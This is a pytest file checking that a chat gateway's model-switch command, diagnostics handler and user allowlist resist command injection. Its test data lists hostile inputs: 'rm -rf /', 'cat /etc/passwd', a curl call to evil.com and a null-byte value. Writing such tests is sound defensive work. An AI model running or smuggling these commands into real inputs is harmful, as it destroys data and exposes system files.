import pytest
from unittest.mock import MagicMock, AsyncMock
from gateway.slash_commands_status import GatewayStatusCommandsMixin
from gateway.platforms.event import MessageEvent
from hermes_cli.model_switch import switch_model


def test_command_injection_defense_in_model_switch():
    # Attempting shell command injection via /model
    malicious_inputs = [
        "; rm -rf /",
        "$(whoami)",
        "`cat /etc/passwd`",
        "openai/gpt-4o; curl http://evil.com",
        "model\x00malicious",
        "A" * 10000,  # Buffer overflow / ReDoS attempt
    ]

    for attack in malicious_inputs:
        # None of these should execute shell commands or crash python
        result = switch_model(
            raw_input=attack,
            current_provider="openai",
            current_model="gpt-4o",
            is_global=False,
            user_providers=[],
            custom_providers={},
        )
        # Should gracefully fail or resolve cleanly without shell execution
        assert result is not None
        assert isinstance(result.success, bool)


@pytest.mark.asyncio
async def test_diagnose_command_with_null_bytes_and_noise():
    class DummyGateway(GatewayStatusCommandsMixin):
        def __init__(self):
            self.adapters = {}

    gw = DummyGateway()

    # Pass malicious event with null bytes and control chars in text
    malicious_event = MessageEvent(
        text="/diagnose \x00\x1b[2J\r\n; touch /tmp/pwned",
        user_id="attacker_666",
    )

    report = await gw._handle_diagnose_command(malicious_event)
    assert "Hermes Diagnostics" in report
    # Verify no /tmp/pwned created
    import os
    assert not os.path.exists("/tmp/pwned")


def test_rbac_authorization_logic():
    from gateway.authz_mixin import _allows, _coerce_allow_set

    allowlist = _coerce_allow_set("user_100, user_200, user_300")
    assert _allows(allowlist, "user_100") is True
    assert _allows(allowlist, "user_200") is True

    # Unauthorized users must be denied
    assert _allows(allowlist, "user_999") is False
    assert _allows(allowlist, "user_100; rm -rf") is False
    assert _allows(allowlist, None) is False
    assert _allows(allowlist, "") is False
